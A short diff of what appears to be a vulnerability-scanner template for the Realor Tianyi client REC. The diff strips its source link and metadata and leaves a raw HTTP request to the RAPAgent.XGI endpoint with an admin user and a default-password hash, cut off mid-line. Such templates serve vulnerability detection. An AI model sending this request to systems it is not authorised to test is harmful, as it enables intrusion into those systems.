@@ -3,12 +3,8 @@ info:
   name: 瑞友天翼客户端 REC
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wqrsa0qpd2gxmh28'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wqrsa0qpd2gxmh28
-    fofa: 暂无
 http:
 - raw:
   - 'GET /RAPAgent.XGI?CMD=GETApplication&AppID=APP00000001&Language=ZH-CN&User=admin&PWD=e10adc3949ba59abbe56e057f20f883e&AuthType=0&Computer=WIN-1TLJMBOFIT6&Finger=A45A2E5E3&IP= HTTP/1.1
